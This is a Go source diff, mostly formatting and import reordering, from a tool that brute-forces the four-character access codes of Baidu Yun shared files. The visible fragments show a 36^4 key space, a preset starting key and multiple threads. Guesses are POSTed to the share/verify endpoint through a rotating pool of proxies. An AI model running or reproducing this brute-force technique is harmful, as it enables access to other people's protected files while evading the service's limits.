@@ -1,48 +1,48 @@
 package main
 
 import (
+	"bufio"
 	"encoding/json"
 	"fmt"
 	"gopkg.in/alecthomas/kingpin.v2"
 	"gopkg.in/cheggaaa/pb.v1"
+	"io/ioutil"
 	"log"
+	"math/rand"
 	"net/http"
 	"net/http/cookiejar"
+	"net/url"
 	"os"
+	"os/signal"
 	"regexp"
 	"strconv"
 	"strings"
 	"sync"
 	"time"
-	"os/signal"
-	"bufio"
-	"io/ioutil"
-	"math/rand"
-	"net/url"
 )
 
 const (
-	MAX_VALUE int64 = 1679616 // 36^4
-	MAX_RETRY = 10
-	RETRY_TIME = 5 * time.Second
-	TIMEOUT = 20 * time.Second
+	MAX_VALUE  int64 = 1679616 // 36^4
+	MAX_RETRY        = 10
+	RETRY_TIME       = 5 * time.Second
+	TIMEOUT          = 20 * time.Second
 )
 
 var (
-	link = kingpin.Arg("link", "URL of BaiduYun file you want to get.").Required().String()
-	preset = kingpin.Flag("preset", "The preset start of key to brute.").Short('p').Default("0000").String()
-	thread = kingpin.Flag("thread", "Number of thread.").Short('t').Default("10").Int64()
+	link        = kingpin.Arg("link", "URL of BaiduYun file you want to get.").Required().String()
+	preset      = kingpin.Flag("preset", "The preset start of key to brute.").Short('p').Default("0000").String()
+	thread      = kingpin.Flag("thread", "Number of thread.").Short('t').Default("10").Int64()
 	resolver    []*Resolve
 	bar         *pb.ProgressBar
 	shareid, uk string
-	start int64
-	refer string
-	wg sync.WaitGroup
+	start       int64
+	refer       string
+	wg          sync.WaitGroup
 	proxies     map[Proxy]int
 	updater     []*Proxies
-	mapLocker *sync.Mutex
-	useable *AtomBool
-	nullP Proxy
+	mapLocker   *sync.Mutex
+	useable     *AtomBool
+	nullP       Proxy
 )
 
 type Info struct {
@@ -85,7 +85,6 @@ func (b *AtomBool) Get() bool {
 }
 
 func getProxy() (Proxy, bool) {
-	//strings.Contains(err.Error(), "error connecting to proxy")
 	mapLocker.Lock()
 	defer mapLocker.Unlock()
 	for {
@@ -289,7 +288,7 @@ func builder(now string) (*http.Response, Proxy, error) {
 	}
 	par, _ := url.Parse(fmt.Sprintf("%s://%s:%s", pro.typ, pro.addr, pro.port))
 	session := &http.Client{
-		Timeout: TIMEOUT,
+		Timeout:   TIMEOUT,
 		Transport: &http.Transport{Proxy: http.ProxyURL(par)},
 	}
 	req, err := http.NewRequest("POST", fmt.Sprintf("https://pan.baidu.com/share/verify?shareid=%s&uk=%s", shareid, uk), strings.NewReader(fmt.Sprintf("pwd=%04s&vcode=&vcode_str=", now)))
